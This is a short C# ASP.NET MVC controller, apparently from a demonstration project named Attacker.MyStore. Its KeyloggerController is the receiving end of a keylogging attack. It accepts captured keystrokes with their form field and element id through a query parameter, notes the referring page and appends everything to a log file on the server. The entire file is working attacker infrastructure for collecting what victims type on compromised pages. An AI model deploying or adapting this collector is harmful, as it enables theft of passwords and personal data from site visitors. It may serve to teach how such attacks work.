using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace Attacker.MyStore.Controllers
{
    public class KeyloggerController : Controller
    {
        // GET: Keylogger
        public ActionResult Index(string k)
        {
            var payload = k.Split(',');

            ViewBag.Key = payload[0];
            ViewBag.Field = payload[1];
            ViewBag.Id = payload[2];

            ViewBag.Referrer = Request.UrlReferrer;

            var fileName = Server.MapPath("~/App_Data/KeyLogger.Log");
            try
            {
                System.IO.File.AppendAllText(fileName, k + Environment.NewLine);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine(ex.ToString());
            }
            return View();
        }
    }
}